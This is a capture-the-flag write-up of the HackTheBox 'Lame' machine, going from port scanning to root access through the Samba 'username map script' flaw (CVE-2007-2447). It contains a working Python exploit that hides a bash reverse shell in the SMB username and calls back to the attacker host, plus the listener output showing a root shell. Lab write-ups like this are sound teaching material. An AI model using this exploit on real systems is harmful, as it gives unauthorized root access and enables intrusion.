Lame is the classic HackTheBox starter machine: an Ubuntu 8.04 box where a single unpatched Samba service hands you root in under five minutes — if you recognize the version string. This write-up documents the full path from initial Nmap sweep to the root flag.

#Reconnaissance

Standard first move: full port sweep with service detection and default scripts against the target IP (10.10.10.3).

bash — nmap 
nmap -sC -sV -p- -oA lame 10.10.10.3

# Nmap scan report for 10.10.10.3
21/tcp   open  ftp     vsftpd 2.3.4
139/tcp  open  netbios-ssn  Samba smbd 3.X
445/tcp  open  netbios-ssn  Samba smbd 3.0.20-Debian
3632/tcp open  distccd  distccd v1 ((Debian))

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Three attack surfaces jump out: vsftpd 2.3.4 (the famous backdoor bait), distccd (unauthenticated command execution), and Samba 3.0.20-Debian. The Samba version is the intended path.

#Enumeration

Version strings are only useful when checked against exploit databases — searchsploit is fastest:

bash — searchsploit 
$ searchsploit samba 3.0.20

Samba 3.0.20 - 'username map script' Command Execution
exploits/linux/remote/16321.rb

$ smbclient -L //10.10.10.3 -N
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh no
        ipc$            IPC       IPC Service (lame server (Samba 3.0.20))

The exploit targets CVE-2007-2447: the username map script option passes the SMB username through system() without sanitizing shell metacharacters. Any username containing | gets executed as a shell command — by the Samba process, which runs as root.

#Exploitation — usermap_script

I scripted the exploit in Python for a clean reverse shell instead of the Metasploit module. The payload is smuggled inside the SMB username:

python — exploit.py 
#!/usr/bin/env python3
"""CVE-2007-2447 Samba username map script RCE."""
import subprocess, sys

LHOST, LPORT, TARGET = "10.10.14.5", 4444, "10.10.10.3"

# shell metacharacters inside the SMB username are executed by system()
user = (
    f'|`bash -c "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"`'
)

cmd = [
    "smbclient", f"//{TARGET}/print$",
    "-U", user, "-N",
]
print("[*] firing payload via SMB username...")
subprocess.run(cmd, timeout=10)
print("[+] check your listener")
bash — listener 
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.3] 59771

whoami
root
id
uid=0(root) gid=0(root) groups=0(root)

#Privilege Escalation

There is no escalation step — the Samba service runs as root, so we land straight at uid=0. Grab the flags:

bash — flags 
$ cat /root/flag.txt
3f0a0c1e...redacted...c9b17f

# user flag also readable as root
$ cat /home/makis/flag.txt
09ec25c9...redacted...a4e02b

If we had landed as an unprivileged user, the follow-up would be standard Linux privesc: sudo -l, SUID enumeration, and kernel version checks — but on Lame the service itself is the shortcut.

#Lessons Learned

  • Version strings are leads, not noise. A dated -Debian suffix mapped directly to a 2007 CVE with a five-line exploit.
  • Escalation can happen at initial access. Not every root shell needs a privesc chain — check what user the vulnerable service runs as.
  • Known-good tooling first. searchsploit before custom code; script only what the public exploit doesn't cover cleanly.
  • Patch the perimeter. Samba 3.0.20 sat exposed on 445 with an unauthenticated RCE — the fix in 2007 was one package update.
If the service runs as root, one exploit is the whole machine.
